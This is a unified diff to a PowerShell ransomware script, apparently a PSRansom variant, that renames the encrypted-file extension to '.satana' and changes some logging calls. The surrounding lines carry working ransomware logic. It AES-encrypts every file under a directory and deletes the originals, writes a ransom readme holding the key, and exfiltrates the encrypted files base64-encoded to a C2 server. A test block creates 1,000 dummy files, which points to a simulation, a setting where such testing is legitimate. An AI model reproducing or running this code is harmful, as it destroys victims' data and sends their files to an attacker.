@@ -98,7 +98,7 @@ function Invoke-AESEncryption {
                 $File = Get-Item -Path $Path -ErrorAction SilentlyContinue
                 if (!$File.FullName) { break }
                 $plainBytes = [System.IO.File]::ReadAllBytes($File.FullName)
-                $outPath = $File.FullName + ".psr" }
+                $outPath = $File.FullName + ".satana" }
 
              $encryptor = $aesManaged.CreateEncryptor()
              $encryptedBytes = $encryptor.TransformFinalBlock($plainBytes, 0, $plainBytes.Length)
@@ -117,7 +117,7 @@ function Invoke-AESEncryption {
                 $File = Get-Item -Path $Path -ErrorAction SilentlyContinue
                 if (!$File.FullName) { break }
                 $cipherBytes = [System.IO.File]::ReadAllBytes($File.FullName)
-                $outPath = $File.FullName.replace(".psr","") }
+                $outPath = $File.FullName.replace(".satana","") }
 
              $aesManaged.IV = $cipherBytes[0..15]
              $decryptor = $aesManaged.CreateDecryptor()
@@ -292,7 +292,7 @@ function CreateReadme {
    Add-Content -Path "$Directory$slash$Readme" -Value "Recovery Key: $PSRKey `n" }}
 
 function EncryptFiles { 
-   $ExcludedFiles = '*.psr', 'readme.txt', '*.dll', '*.ini', '*.sys', '*.exe', '*.msi', '*.NLS', '*.acm', '*.nls', '*.EXE', '*.dat', '*.efi', '*.mui'
+   $ExcludedFiles = '*.satana', '*.psr', 'readme.txt', '*.dll', '*.ini', '*.sys', '*.exe', '*.msi', '*.NLS', '*.acm', '*.nls', '*.EXE', '*.dat', '*.efi', '*.mui'
    foreach ($i in $(Get-ChildItem $Directory -recurse -exclude $ExcludedFiles | Where-Object { ! $_.PSIsContainer } | ForEach-Object { $_.FullName })) { 
    Invoke-AESEncryption -Mode Encrypt -Key $PSRKey -Path $i ; Add-Content -Path "$Directory$slash$Readme" -Value "[!] $i is now encrypted" ; Remove-Item $i }
    $RansomLogs = Get-Content "$Directory$slash$Readme" | Select-String "[!]" | Select-String "PSRansom!" -NotMatch ; if (!$RansomLogs) { 
@@ -301,18 +301,18 @@ function EncryptFiles {
 function ExfiltrateFiles {
    Invoke-WebRequest -useb "$C2Server`:$C2Port/files" -Method GET 2>&1> $null 
    $RansomLogs = Get-Content "$Directory$slash$Readme" | Select-String "No files have been encrypted!" ; if (!$RansomLogs) {
-   foreach ($i in $(Get-ChildItem $Directory -recurse -filter *.psr | Where-Object { ! $_.PSIsContainer } | ForEach-Object { $_.FullName })) {
+   foreach ($i in $(Get-ChildItem $Directory -recurse -filter *.satana | Where-Object { ! $_.PSIsContainer } | ForEach-Object { $_.FullName })) {
       $Pfile = $i.split($slash)[-1] ; $B64file = R64Encoder -f $i ; $B64Name = R64Encoder -t $Pfile
       Invoke-WebRequest -useb "$C2Server`:$C2Port/files/$B64Name" -Method POST -Body $B64file 2>&1> $null }}
    else { $B64Name = R64Encoder -t "none.null" ; Invoke-WebRequest -useb "$C2Server`:$C2Port/files/$B64Name" -Method POST -Body $B64file 2>&1> $null }}
 
 function DecryptFiles {
-   foreach ($i in $(Get-ChildItem $Directory -recurse -filter *.psr | Where-Object { ! $_.PSIsContainer } | ForEach-Object { $_.FullName })) {
-      Invoke-AESEncryption -Mode Decrypt -Key $PSRKey -Path $i ; $rfile = $i.replace(".psr","")
+   foreach ($i in $(Get-ChildItem $Directory -recurse -filter *.satana | Where-Object { ! $_.PSIsContainer } | ForEach-Object { $_.FullName })) {
+      Invoke-AESEncryption -Mode Decrypt -Key $PSRKey -Path $i ; $rfile = $i.replace(".satana","")
       Write-Host "[+] $rfile is now decrypted" -ForegroundColor Blue } ; Remove-Item "$Directory$slash$Readme" }
 
 function CheckFiles { 
-   $RFiles = Get-ChildItem $Directory -recurse -filter *.psr ; if ($RFiles) { $RFiles | Remove-Item } else {
+   $RFiles = Get-ChildItem $Directory -recurse -filter *.satana ; if ($RFiles) { $RFiles | Remove-Item } else {
    Write-Host "[!] No encrypted files has been found!" -ForegroundColor Red }}
 
 # Main
@@ -334,14 +334,14 @@ else {
    Write-Host "[+] Testing folder $Directory.." -ForegroundColor Blue
    if (Test-Path -Path $Directory) {
 		#Path exists. Cleanup.
-		Write-Host "    $Directory folder exist" -ForegroundColor Blue
+		Write-Output "    $Directory folder exist" -ForegroundColor Blue
    } else {
 		#Path doesn't exist. Creating new one!
-		Write-Host "    No $Directory folder, creating one" -ForegroundColor Blue
+		Write-Output "    No $Directory folder, creating one" -ForegroundColor Blue
 		mkdir $Directory | Out-Null
    }
    
-   Write-Host "[+] Creating 1k test txt files with test content" -ForegroundColor Blue
+   Write-Output "[+] Creating 1k test txt files with test content" -ForegroundColor Blue
    1..1000 | ForEach-Object {
       Out-File -InputObject 'RansomwareTest Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Morbi enim nunc faucibus a. Pharetra pharetra massa massa ultricies. Metus vulputate eu scelerisque felis imperdiet proin fermentum. A scelerisque purus semper eget duis at tellus at urna. Consequat nisl vel pretium lectus quam id leo in vitae. Bibendum ut tristique et egestas quis ipsum. Ultrices neque ornare aenean euismod elementum nisi quis eleifend. Libero nunc consequat interdum varius sit amet mattis vulputate enim. Aliquet nibh praesent tristique magna sit amet purus.
 
